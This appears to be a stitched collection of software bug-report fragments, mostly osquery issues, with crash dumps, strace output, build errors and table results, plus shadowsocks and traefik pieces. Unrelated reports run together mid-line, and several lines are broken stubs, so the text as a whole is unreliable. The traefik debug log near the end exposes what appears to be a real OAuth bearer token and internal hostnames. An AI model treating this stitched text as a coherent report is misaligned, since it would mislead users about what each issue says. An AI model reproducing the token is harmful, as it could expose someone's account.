@\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, ...], 6880, 0, null, null) = 6880
recvfrom(4, "", 0, 0, null, null) = 0
nanosleep({tv_sec=0, tv_nsec=20000}, null) = 0
recvfrom(4, "", 0, 0, null, null) = 0
nanosleep({tv_sec=0, tv_nsec=20000}, null) = 0
recvfrom(4, ```
the result for queries '1_1' will be populated.
#l10355
"failed to expand globs: failed to open registry handle","registry.cpp:568","2","0",,"4","1","10","-9223372036854775807","865","facebook","f7740e18-3259-434f-9759-976319968900","osquery","3176","3180","appvyr-win","s-1-5-18","10/8/2018 6:30:05 pm",,,"osquery","system.uint32[]","system.diagnostics.eventing.reader.eventbookmark","information",,,"system.collections.objectmodel.readonlycollection`1[system.string]","system.collections.generic.list`1[system.diagnostics.eventing.reader.eventproperty]"
"failed to expand globs: failed to open registry handle","registry.cpp:568","2","0",,"4","1","10","-9223372036854775807","863","facebook","f7740e18-3259-434f-9759-976319968900","osquery","3176","3180","appvyr-win","s-1-5-18","10/8/2018 6:30:05 pm",,,"osquery","system.uint32[]","system.diagnostics.eventing.reader.eventbookmark","information",,,"system.collections.objectmodel.readonlycollection`1[system.string]","system.collections.generic.list`1[system.diagnostics.eventing.reader.eventproperty]" ```
[e1008 20:26:36.127249 3676 init.cpp:608] [ref #1629] osqueryd initialize failed: could not initialize database
and sometimes it is [e1008 19:02:11.033499 2224 init.cpp:574] cannot activate filesystem logger plugin: could not create file: \\programdata\\osquery\\log\\osqueryd.results.log furthermore, this "bug" sometimes occurs by itself(without me randomly running these commands), just by osquery daemon, i.e
7\\10 user workstations(different windows versions) with osquery running finished up in this state: daemon is running, but database is not updated
when we were watching "broken" osquery process under windbg, it was clear that the process was waiting for the database to be "released"
feel free to ask any details about an issue.
encryption status = 1
osqueryi crash, with error code
### windbg (!analyze -v) ran program using app verifier in order to collect a dmp file
crash seems to stem from an unhandled exception thrown from boost::filesystem code (see stack frames and )
0:000> !analyze -v
*******************************************************************************
* exception analysis *
******************************************************************************* geturlpagedata2 (winhttp) failed: 12002
dump_class: 2 dump_qualifier: 400 context: (.ecxr)
rax=0000000000000001 rbx=0000000000000000 rcx=0000000000000007
rdx=0000000000000000 rsi=0000000000000000 rdi=00007ff7ad6bbe60
rip=00007ff7ad7112a4 rsp=000000c6e697c5f0 rbp=000000c6e697fab0 r8=00007ff7adc83888 r9=00000000ffffffff r10=0000000000000001
r11=0000000000000001 r12=0000000000000001 r13=000000c6e697fab0
r14=000000c6e697c910 r15=000000c6e697c7f0
iopl=0 nv up ei pl nz na pe nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202
osqueryi!abort+ :
00007ff7`ad7112a4 cd29 int 29h
resetting default scope faulting_ip: osqueryi!abort+34 [d:\\th\\minkernel\\crts\\ucrt\\src\\appcrt\\startup\\abort.cpp @ 77]
00007ff7`ad7112a4 cd29 int 29h exception_record: 000000c6e697d0a8 -- (.exr )
exceptionaddress: 00007ff7add0898c (osqueryi!__scrt_ucrt_dll_is_in_use <perf> (osqueryi+ )) exceptioncode: 00000000 exceptionflags: 00007ff7
numberparameters: 1352 parameter[0]: 00007ffde27666ba parameter[1]: 00007ffde28c4f30 parameter[2]: 00007ffde28c4f30 parameter[3]: 00007ffde28c4f30 parameter[4]: 00007ffde276686c parameter[5]: 000000c6e697a000 parameter[6]: 00007ff7add0898c parameter[7]: 0000000000000005 parameter[8]: 00007ffde27666ba parameter[9]: 00007ffde28c4f30 parameter[10]: 000000c6e697d1c8 parameter[11]: 0000000000000000 parameter[12]: 0000000000000001 parameter[13]: 000000c6e697a000 parameter[14]: 00007ffd00000000 process_name: osqueryi.exe error_code: (ntstatus) - the system detected an overrun of a stack-based buffer in this application
this overrun could potentially allow a malicious user to gain control of this application
exception_code: (ntstatus) - the system detected an overrun of a stack-based buffer in this application
this overrun could potentially allow a malicious user to gain control of this application
exception_code_str: c0000409 exception_parameter1: 0000000000000007 watson_bkt_procstamp: 5b91ba40 watson_bkt_procver: 3.3.0.0 process_ver_product: osquery watson_bkt_module: osqueryi.exe watson_bkt_modstamp: 5b91ba40 watson_bkt_modoffset: 9112a4 watson_bkt_modver: 3.3.0.0 module_ver_product: osquery build_version_string: 10.0.17134.1 (winbuild.160101.0800) modlist_with_tschksum_hash: c69b7ba1838560bc5a57d748f36b181c107dbd8d modlist_sha1_hash: ec5622d6f64ffe9dacdf5a782d61ee41d7686c63 ntglobalflag: 2000100 process_bam_current_throttled: 0 process_bam_previous_throttled: 0 application_verifier_flags: 80643027 product_type: 1 suite_mask: 272 dump_flags: 8000c07 dump_type: 3 application_verifier_loaded: 1 analysis_session_host: tferguson-dt analysis_session_time: 09-07-2018 10:06:26.0672 analysis_version: 10.0.15063.468 amd64fre thread_attributes: os_locale: enu problem_classes: id: [0n262] type: [fail_fast] class: primary scope: default_bucket_id (failure bucket id prefix) bucket_id name: add data: omit pid: [unspecified] tid: [unspecified] frame: [0] id: [0n253] type: [fatal_app_exit] class: addendum scope: default_bucket_id (failure bucket id prefix) bucket_id name: add data: omit pid: [unspecified] tid: [unspecified] frame: [0] id: [0n92] type: [avrf] class: addendum scope: default_bucket_id (failure bucket id prefix) bucket_id name: add data: omit pid: [ ] tid: [ ] frame: [0] : osqueryi!abort bugcheck_str: fail_fast_fatal_app_exit_avrf default_bucket_id: fail_fast_fatal_app_exit_avrf primary_problem_class: fail_fast last_control_transfer: from 0000000000000000 to 000725dc0013252c ip_on_heap: 000725dc0013252c
the fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\\bin\\build_logs\\timebuild\ trebase.log for module which may
contain the address if it were loaded
stack_text: ## stack-pointer return-address call-site 00 000000c6e697c5f0 00007ff7ad719716 osqueryi!abort+34 01 000000c6e697c620 00007ff7ad6bbe97 osqueryi!terminate+26 02 000000c6e697c650 00007ffddf81c0a0 osqueryi!__scrt_unhandled_exception_filter+37 03 000000c6e697c680 00007ffde28026d7 kernelbase!unhandledexceptionfilter+190 04 000000c6e697c790 00007ffde27eab06 ntdll!rtluserthreadstart$filt$0+38 05 000000c6e697c7c0 00007ffde27feced ntdll!_c_specific_handler+96 06 000000c6e697c830 00007ffde2766c86 ntdll!rtlpexecutehandlerforexception+d 07 000000c6e697c860 00007ffde27652ca ntdll!rtldispatchexception+3c6 08 000000c6e697cf60 00007ffddf76a388 ntdll!rtlraiseexception+31a 09 000000c6e697de00 00007ff7ad6ed772 kernelbase!raiseexception+68 0a 000000c6e697dee0 00007ff7ad3281ba osqueryi!_cxxthrowexception+c2 0b 000000c6e697df60 00007ff7ad328f26 osqueryi!boost::filesystem::detail::possible_large_file_size_support+12a 0c 000000c6e697e060 00007ff7ad0e2610 osqueryi!boost::filesystem::detail::status+106 0d 000000c6e697e110 00007ff7acfad17c osqueryi!osquery::platformstat+60 0e 000000c6e697e500 00007ff7acfac616 osqueryi!osquery::tables::genfileinfo+4cc 0f 000000c6e697e7a0 00007ff7acf9dc9c osqueryi!osquery::tables::genfile+386 10 000000c6e697e960 00007ff7ad2bc0ac osqueryi!osquery::filetableplugin::generate+1c 11 000000c6e697e9a0 00007ff7ad06755f osqueryi!osquery::tables::sqlite::xeof+dac 12 000000c6e697ed00 00007ff7ad05c65d osqueryi!sqlite3_column_database_name+616ff 13 000000c6e697f050 00007ff7acff0b51 osqueryi!sqlite3_column_database_name+567fd 14 000000c6e697f080 00007ff7acf91b7c osqueryi!sqlite3_step+c1 (perf)
15 000000c6e697f0d0 00007ff7acf90e7d osqueryi!osquery::runquery+d2c 16 000000c6e697f190 00007ff7acf8d693 osqueryi!osquery::runquery+2d 17 000000c6e697f1c0 00007ff7acf996f7 osqueryi!osquery::launchintoshell+293 18 000000c6e697f780 00007ff7acf99547 osqueryi!osquery::startshell+177 19 000000c6e697f810 00007ff7acf9bc63 osqueryi!osquery::startosquery+2c7 1a 000000c6e697f940 00007ff7ad6bb96d osqueryi!main+a3 1b 000000c6e697fa40 00007ffddfcd3034 osqueryi!__scrt_common_main_seh+11d 1c 000000c6e697fa80 00007ffde27d1431 kernel32!basethreadinitthunk+14 1d 000000c6e697fab0 0000000000000000 ntdll!rtluserthreadstart+21 thread_sha1_hash_mod_func: 68e3899d0560c6fc78e56505cda864818b7df6f4 thread_sha1_hash_mod_func_offset: b793eedaee240df29c9d38eb361e2ff8a8f1a728 thread_sha1_hash_mod: c92b0174403522825e7b9fc23a14d89477b28d24 followup_ip: osqueryi!abort+34 [d:\\th\\minkernel\\crts\\ucrt\\src\\appcrt\\startup\\abort.cpp @ 77]
00007ff7`ad7112a4 cd29 int 29h fault_instr_code: b84129cd faulting_source_line: d:\\th\\minkernel\\crts\\ucrt\\src\\appcrt\\startup\\abort.cpp faulting_source_file: d:\\th\\minkernel\\crts\\ucrt\\src\\appcrt\\startup\\abort.cpp faulting_source_line_number: 77 faulting_source_code: no source found for 'd:\\th\\minkernel\\crts\\ucrt\\src\\appcrt\\startup\\abort.cpp' symbol_stack_index: 0 symbol_name: osqueryi!abort+34 followup_name: machineowner module_name: osqueryi image_name: osqueryi.exe debug_flr_image_timestamp: 5b91ba40 stack_command: .ecxr ; kb bucket_id: fail_fast_fatal_app_exit_avrf_osqueryi!abort+34 failure_exception_code: c0000409 failure_image_name: osqueryi.exe bucket_id_image_str: osqueryi.exe failure_module_name: osqueryi bucket_id_module_str: osqueryi failure_function_name: abort bucket_id_function_str: abort bucket_id_offset: 34 bucket_id_modtimedatestamp: 5b91ba40 bucket_id_modchecksum: 0 bucket_id_modver_str: 3.3.0.0 bucket_id_prefix_str: fail_fast_fatal_app_exit_avrf_ failure_problem_class: fail_fast failure_symbol_name: osqueryi.exe!abort failure_bucket_id: fail_fast_fatal_app_exit_avrf_c0000409_osqueryi.exe!abort watson_stageone_url: target_time: 2018-09-07t00:26:44.000z osbuild: 17134 osservicepack: 1 servicepack_number: 0 os_revision: 0 osplatform_type: x64 osname: windows 10 osedition: windows 10 winnt singleuserts user_lcid: 0 osbuild_timestamp: 2020-08-27 21:38:41 builddatestamp_str: 160101.0800 buildlab_str: winbuild buildosver_str: 10.0.17134.1 analysis_session_elapsed_time: 61fa analysis_source: um failure_id_hash_string: um:fail_fast_fatal_app_exit_avrf_c0000409_osqueryi.exe!abort failure_id_hash: {fc98bad0-d041-f318-ce2d-07775187a125} followup: machineowner
--------- ```
some usernames are missing
## problem the table implementation doesn't properly filter the events it gets from `getutxent*()` which contains not only user login/logout but other events like boot and shutdown times which don't have a username associated
we should filter out these entries or fix the table schema to accommodate this events
tests for the table #5138 should be merged after this bug is fixed.
note the extra spaces, which are undesirable
[ { "hardware_model": "macbookpro13,3 ", "hardware_vendor": "apple inc
", "hardware_version": "1.0 " }
nonsense numbers like 1477, 856 etc
ssl short_read_error: http_client closing socket ### additional information 1) if osqueryd is posting to localhost there is not an issue.
2) if osqueryd is posting to a remote host then you receive the error
3) if you enable --verbose then the error goes away and osqueryd posts successfully to the tls endpoing
4) this has been tested on ubuntu 14.04 package of osquery as well
5) all packages were installed from repositories listed on osquery.io website, no custom builds
6) the issue only presents itself on the logger call, not on the enroll or config calls
zaphod@heart-of-gold:~/osquery$ make sysprep
[+] found ubuntu provision script: /home/zaphod/osquery/tools/provision/ubuntu.sh
[+] requesting sudo: apt-get -y update
[sudo] password for zaphod:
hit:1 bionic inrelease
get:2 bionic-security inrelease [83.2 kb]
get:3 bionic-updates inrelease [88.7 kb]
fetched 172 kb in 6s (29.4 kb/s)
reading package lists..
[+] autopoint is already installed
[+] automake is already installed
[+] autoconf is already installed
[+] libtool is already installed
[+] pkg-config is already installed
[+] g++ is already installed
[+] curl is already installed
[+] bison is already installed
[+] flex is already installed
[+] ruby is already installed
[+] ruby-dev is already installed
dpkg-query: no packages found matching bsdtar
[+] installing bsdtar
reading package lists...
building dependency tree...
reading state information...
package bsdtar is not available, but is referred to by another package.
this may mean that the package is missing, has been obsoleted, or
is only available from another source e: package 'bsdtar' has no installation candidate
makefile:232: recipe for target 'sysprep' failed
make: *** [sysprep] error 100
``` i then manually installed the rest of the packages under bsdtar here:
#l26 and ran `make deps` which ran without issue, but then when i try to compile any extension beyond the example.cpp extension i this error: ```
[ 98%] building cxx object external/cmakefiles/test_osquery_extensions.dir/osquery_extension_group_main.cpp.o
in file included from /home/zaphod/osquery/build/bionic/external/osquery_extension_group_main.cpp:11:
in file included from /home/zaphod/osquery/include/osquery/sdk.h:17:
in file included from /home/zaphod/osquery/include/osquery/config.h:13:
in file included from /usr/local/osquery/include/c++/v1/map:441:
in file included from /usr/local/osquery/include/c++/v1/__config:186:
in file included from /usr/local/osquery/legacy/include/features.h:357:
/usr/include/x86_64-linux-gnu/sys/cdefs.h:467:28: error: function-like macro '__glibc_clang_prereq' is not defined
#if __gnuc_prereq (4,8) || __glibc_clang_prereq (3,5) ^
in file included from /home/zaphod/osquery/build/bionic/external/osquery_extension_group_main.cpp:11:
in file included from /home/zaphod/osquery/include/osquery/sdk.h:17:
in file included from /home/zaphod/osquery/include/osquery/config.h:13:
in file included from /usr/local/osquery/include/c++/v1/map:442:
in file included from /usr/local/osquery/include/c++/v1/__tree:15:
in file included from /usr/local/osquery/include/c++/v1/iterator:416:
in file included from /usr/local/osquery/include/c++/v1/iosfwd:90:
in file included from /usr/local/osquery/include/c++/v1/wchar.h:119:
in file included from /usr/local/osquery/legacy/include/wchar.h:37:
in file included from /usr/local/osquery/include/c++/v1/stdio.h:17:
/usr/local/osquery/legacy/include/stdio.h:47:1: error: unknown type name '__begin_namespace_std'
__begin_namespace_std
/usr/local/osquery/legacy/include/stdio.h:49:1: error: expected unqualified-id
typedef struct _io_file file;
/usr/local/osquery/legacy/include/stdio.h:50:1: error: unknown type name '__end_namespace_std'
__end_namespace_std
/usr/local/osquery/legacy/include/stdio.h:54:23: error: unknown type name 'file'
__using_namespace_std(file) ^
/usr/local/osquery/legacy/include/stdio.h:54:28: error: expected ';' after top level declarator
__using_namespace_std(file) ^
in file included from /home/zaphod/osquery/build/bionic/external/osquery_extension_group_main.cpp:11:
in file included from /home/zaphod/osquery/include/osquery/sdk.h:17:
in file included from /home/zaphod/osquery/include/osquery/config.h:13:
in file included from /usr/local/osquery/include/c++/v1/map:442:
in file included from /usr/local/osquery/include/c++/v1/__tree:15:
in file included from /usr/local/osquery/include/c++/v1/iterator:416:
in file included from /usr/local/osquery/include/c++/v1/iosfwd:90:
in file included from /usr/local/osquery/include/c++/v1/wchar.h:119:
/usr/local/osquery/legacy/include/wchar.h:104:1: error: unknown type name '__begin_namespace_c99'
__begin_namespace_c99
/usr/local/osquery/legacy/include/wchar.h:106:1: error: expected unqualified-id
typedef __mbstate_t mbstate_t;
/usr/local/osquery/legacy/include/wchar.h:107:1: error: unknown type name '__end_namespace_c99'
__end_namespace_c99
/usr/local/osquery/legacy/include/wchar.h:109:23: error: unknown type name 'mbstate_t'; did you mean '__mbstate_t'?
__using_namespace_c99(mbstate_t) ^
/usr/local/osquery/legacy/include/wchar.h:95:3: note: '__mbstate_t' declared here
} __mbstate_t; ^
/usr/local/osquery/legacy/include/wchar.h:109:33: error: expected ';' after top level declarator
__using_namespace_c99(mbstate_t) ^
/usr/local/osquery/legacy/include/wchar.h:131:1: error: unknown type name '__begin_namespace_std'
__begin_namespace_std
/usr/local/osquery/legacy/include/wchar.h:134:1: error: expected unqualified-id
/usr/local/osquery/legacy/include/wchar.h:135:1: error: unknown type name '__end_namespace_std'
__end_namespace_std
/usr/local/osquery/legacy/include/wchar.h:139:23: error: unknown type name 'tm'
__using_namespace_std(tm) ^
/usr/local/osquery/legacy/include/wchar.h:142:1: error: expected function body after function declarator
__begin_namespace_std
/usr/local/osquery/legacy/include/wchar.h:165:1: error: unknown type name '__end_namespace_std'
__end_namespace_std
/usr/local/osquery/legacy/include/wchar.h:169:1: error: expected unqualified-id
extern int wcscasecmp (__const wchar_t *__s1, __const wchar_t *__s2) __throw;
/usr/local/osquery/legacy/include/wchar.h:186:1: error: unknown type name '__begin_namespace_std'
__begin_namespace_std
fatal error: too many errors emitted, stopping now [-ferror-limit=]
20 errors generated.
[ 81%] linking cxx executable osquery_additional_tests
ld: warning: ignoring file /usr/local/osquery/lib/libfuzzy.a, file was built for archive which is not the architecture being linked (x86_64): /usr/local/osquery/lib/libfuzzy.a
undefined symbols for architecture x86_64: "_fuzzy_hash_filename", referenced from: osquery::tables::genhashforfile(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, osquery::querycontext&, std::__1::vector<std::__1::map<std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >, std::__1::less<std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > >, std::__1::allocator<std::__1::pair<std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > > > >, std::__1::allocator<std::__1::map<std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >, std::__1::less<std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > >, std::__1::allocator<std::__1::pair<std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > > > > > >&) in lto.o "_fuzzy_compare", referenced from: osquery::sqlitessdeepcomparefunc(sqlite3_context*, int, sqlite3_value**) (.llvm.d284339e) in lto.o
ld: symbol(s) not found for architecture x86_64
``` the commit that prevents me from building osquery is b7079f41f55f61804f7b9f088db570b73aef536
if i roll back before this commit and follow the repro steps, i get a successful build.
data for column family `n` is stored on column family `n-1`
### fix i submitted #4287 to fix the issue but it requires db migration first.
nothing ### notes
this is actually already in the wmi query #l22 but the result is not used
i'm not quite sure how the date should be handled coming back to osquery
microsoft documents it as datetime, and i couldn't find any other use of that type coming back from wmi in osquery today
when querying in powershell, it looks like this:
ps c:\\windows\\system32> get-wmiobject -query "select releasedate from win32_bios" __genus : 2
__class : win32_bios
__superclass :
__dynasty :
__relpath :
__property_count : 1
__derivation : {}
__namespace :
releasedate : 20180702000000.000000+000
pscomputername :
it always returns `0.0.0.0` ### notes
this table definitely works on some older devices, such as a vizio ct15-a1 which i dug up
on that one, it returns `8.0.2.1410` as expected
this table should be very useful for verifying patch status for recent intel me vulnerabilities such as and
an error and a crash
gives error messages and return code = 134
e0628 11:05:35.418220 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.419442 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.420858 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.422544 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.531699 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.532852 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.533974 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.535043 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
e0628 11:05:35.535866 2507449216 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
+--------------+--------------------------------------+-----------+-----------------+-----+--------------------------------------+
| name | uuid | encrypted | type | uid | user_uuid |
+--------------+--------------------------------------+-----------+-----------------+-----+--------------------------------------+
| /dev/disk0 | | | | | |
| /dev/disk0s1 | 0f533033-75f3-4ab4-884b-882678b41bae | | | | |
| /dev/disk0s2 | 71404d30-d9e1-4014-a51e-35c4ebcecbfe | | | | |
| /dev/disk1 | ea5a0c41-0412-4730-92f2-ccaaadfe4799 | | | | |
| /dev/disk1s1 | afb525d1-0ef0-4211-bdf0-f74d9abe0451 | 1 | apfs encryption | 501 | 43d11658-be39-4197-9a95-499d72fe1fb4 |
| /dev/disk1s2 | 7a20b06d-c91c-4756-8a2f-33a6e66b83f3 | 0 | | | |
| /dev/disk1s3 | 2af78e0e-5bc4-42c1-915e-80bfd89ee1fc | 0 | | | |
| /dev/disk1s4 | 13e0a23a-1ff2-4593-9795-f3593e87b62c | 0 | | | |
| /dev/disk2 | | | | | |
| /dev/disk2s1 | 83fa93ef-ffee-4eb4-8914-0748803ef796 | | | | |
| /dev/disk2s2 | bfe77258-4a09-4299-b8be-95b1b224d9cd | | | | |
| /dev/disk2s3 | d0850e11-c5ef-4c18-8f2f-48286b8f8715 | | | | |
| /dev/disk3 | be1ace01-5e00-431f-a49b-1e77d699ecff | | | | |
+--------------+--------------------------------------+-----------+-----------------+-----+--------------------------------------+
the table showed the correct result for the external drive with osquery version 2.8.0:
brandonklise@brandons-macbook-pro: /tmp/2.8
$ ./usr/local/bin/osqueryi --version
osqueryi version 2.8.0
brandonklise@brandons-macbook-pro: /tmp/2.8
$ ./usr/local/bin/osqueryi
using a virtual database
need help, type '.help'
osquery> select * from disk_encryption;
+--------------+--------------------------------------+-----------+---------+-----+-----------+
| name | uuid | encrypted | type | uid | user_uuid |
+--------------+--------------------------------------+-----------+---------+-----+-----------+
| /dev/disk0 | | 0 | | | |
| /dev/disk0s1 | 0f533033-75f3-4ab4-884b-882678b41bae | 0 | | | |
| /dev/disk0s2 | 71404d30-d9e1-4014-a51e-35c4ebcecbfe | 0 | | | |
| /dev/disk1 | ea5a0c41-0412-4730-92f2-ccaaadfe4799 | 0 | | | |
| /dev/disk1s1 | afb525d1-0ef0-4211-bdf0-f74d9abe0451 | 0 | | | |
| /dev/disk1s2 | 7a20b06d-c91c-4756-8a2f-33a6e66b83f3 | 0 | | | |
| /dev/disk1s3 | 2af78e0e-5bc4-42c1-915e-80bfd89ee1fc | 0 | | | |
| /dev/disk1s4 | 13e0a23a-1ff2-4593-9795-f3593e87b62c | 0 | | | |
| /dev/disk2 | | 0 | | | |
| /dev/disk2s1 | 83fa93ef-ffee-4eb4-8914-0748803ef796 | 0 | | | |
| /dev/disk2s2 | bfe77258-4a09-4299-b8be-95b1b224d9cd | 0 | | | |
| /dev/disk2s3 | d0850e11-c5ef-4c18-8f2f-48286b8f8715 | 0 | | | |
| /dev/disk3 | be1ace01-5e00-431f-a49b-1e77d699ecff | 1 | aes-xts | | |
+--------------+--------------------------------------+-----------+---------+-----+-----------+
however, this was broken in #3748:
brandonklise@brandons-macbook-pro: /tmp/2.9
$ ./usr/local/bin/osqueryi --version
osqueryi version 2.9.0
brandonklise@brandons-macbook-pro: /tmp/2.9
$ ./usr/local/bin/osqueryi
using a virtual database
need help, type '.help'
osquery> select * from disk_encryption;
+--------------+--------------------------------------+-----------+-----------------+-----+--------------------------------------+
| name | uuid | encrypted | type | uid | user_uuid |
+--------------+--------------------------------------+-----------+-----------------+-----+--------------------------------------+
| /dev/disk0 | | 0 | | | |
| /dev/disk0s1 | 0f533033-75f3-4ab4-884b-882678b41bae | 0 | | | |
| /dev/disk0s2 | 71404d30-d9e1-4014-a51e-35c4ebcecbfe | 0 | | | |
| /dev/disk1 | ea5a0c41-0412-4730-92f2-ccaaadfe4799 | 0 | | | |
| /dev/disk1s1 | afb525d1-0ef0-4211-bdf0-f74d9abe0451 | 1 | apfs encryption | 501 | 43d11658-be39-4197-9a95-499d72fe1fb4 |
| /dev/disk1s2 | 7a20b06d-c91c-4756-8a2f-33a6e66b83f3 | 0 | | | |
| /dev/disk1s3 | 2af78e0e-5bc4-42c1-915e-80bfd89ee1fc | 0 | | | |
| /dev/disk1s4 | 13e0a23a-1ff2-4593-9795-f3593e87b62c | 0 | | | |
| /dev/disk2 | | 0 | | | |
| /dev/disk2s1 | 83fa93ef-ffee-4eb4-8914-0748803ef796 | 0 | | | |
| /dev/disk2s2 | bfe77258-4a09-4299-b8be-95b1b224d9cd | 0 | | | |
| /dev/disk2s3 | d0850e11-c5ef-4c18-8f2f-48286b8f8715 | 0 | | | |
| /dev/disk3 | be1ace01-5e00-431f-a49b-1e77d699ecff | 0 | | | |
+--------------+--------------------------------------+-----------+-----------------+-----+--------------------------------------+
seeing status logs of all levels on the console.
powershell_events table is empty
osquery is running and subscribing to windows events correctly
the windows_events table has recent windows events from the respective channels.
i see a number of these errors:
e0602 19:42:17.168584 3052168064 disk_encryption.mm:259] error calling isencryptedvolume:encrypted:
``` followed by the expected query results
`"curl" "google.com"`
when osquery starts, files in "/tmp" are created
"/tmp/osqueryd.info" symlink points to /tmp/<glog.file.name.format> file
log entries will continue to append to '/tmp/osqueryd.info' file as scheduled queries run
scheduled queries are written to both logs (rsyslog output file /var/log/osqueryd.log and symlinked file in /tmp).
the table enumerates all users, both local and domain, which have logged on locally (or otherwise created a local registry profile)
also, the stringified windows account sid is in the uuid field.
it has the image path instead
![cwd](
ser-rule.txt ac
ser-rule.txt `||wikimedia.org/api/rest_v1/media/math/*`
ser-rule.txt `||wikimedia.org/*` s
ac
win10
ould not load template file no-server-data or one of its included components.
.0.8
statisticsstrategyconfigurationform string is missing in i18n.csv
.1.8.0 p an
cafee
4.1.6 it ug > : 6f71e6cca67e2a39cebcb0bdf7aae1b5b7f1db0f
> : tgsan <tt.go@163.com>
> : 2019/6/4 17:15:25
> support windows 10 1903 light theme
> > support windows 10 1903 light theme (menu icon color)
> : shadowsocks-csharp/view/menuviewcontroller.cs
> : shadowsocks-csharp/shadowsocks-csharp.csproj ull
shadowsocks ui error
unexpected error, shadowsocks will exit
please report too
exception detail:
system.componentmodel.win32exception ( ): application not found
client "[e] decryption error"
pacjsworker.exe
ip003 cptun)
shadowsocks-android crash
ss://[method&password]@**fdc3%3a90ba%3acaaa%3a4e91%3a%3a**:443
nothing happened.
ie proxy be changed as last ss win using.
chrome failed to connect to websites
[![ss.png](
![shadowsockswinbug](
![image](
the command does not terminate (please see above).
i did not see the metric mentioned above with the tag `failure: true`.
from traefik log (debug): ```
10.48.2.1 - - [25/oct/2020:10:22:00 +0000] "get /ping http/1.1" 200 2 "-" "-" 144687 "ping@internal" "-" 0ms
time="2020-10-25t10:22:00z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/bdiservice/startsession\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\",\\"rawfragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"authorization\\":[\\"bearer ya29.a0afh6smdefg8-jlbbvhernrxw8nonswy0ey08s-fzdo4ee61i8k8uw-zn-kllnc0sedk5byih85jv76rbudwp27gxj5t7fs78odixhclqoryr6muh-kflveao6rpofszqe0ooslkembkfywgk3uteqw6bzk9ig23c0vtfyemhzvcl7pz17njrthkiry4vmwmggevvd2-x9bc4jkkdibnhwq9pt66huf8snuo\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"gzip\\"],\\"ir-agent-id\\":[\\"ir-qa-ofri\\"],\\"ir-version-name\\":[\\"2-0-5\\"],\\"server-version\\":[\\"2.0.0-3333\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-java-okhttp/1.29.0\\"],\\"x-forwarded-host\\":[\\"xxx.yyy.co:443\\"],\\"x-forwarded-port\\":[\\"443\\"],\\"x-forwarded-proto\\":[\\"https\\"],\\"x-forwarded-server\\":[\\"traefik-7ffffd687f-4b8tj\\"],\\"x-real-ip\\":[\\"10.128.0.3\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"elliq-bdi-server-dev2.s.elliq.co:443\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"10.128.0.3:1377\\",\\"requesturi\\":\\"/bdiservice/startsession\\",\\"tls\\":null}"
